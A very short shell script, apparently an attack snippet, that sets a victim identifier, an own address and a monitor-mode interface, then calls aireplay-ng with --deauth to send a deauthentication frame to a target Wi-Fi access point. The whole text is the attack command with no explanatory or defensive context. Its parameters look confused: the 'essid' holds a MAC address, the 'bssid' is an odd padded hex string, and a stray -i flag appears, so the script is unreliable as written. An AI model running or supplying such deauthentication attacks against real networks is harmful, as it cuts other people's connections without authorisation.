#death something?
essid_vic_c=74:4d:28:1a:9a:df
bssid_me_a=90-61-AE-75-FB-CF-3A-30-00-00-00-00-00-00-00-00
dev=mon0

aireplay-ng --deauth 1 -a $bssid_me_a -e $essid_vic_c -i $dev

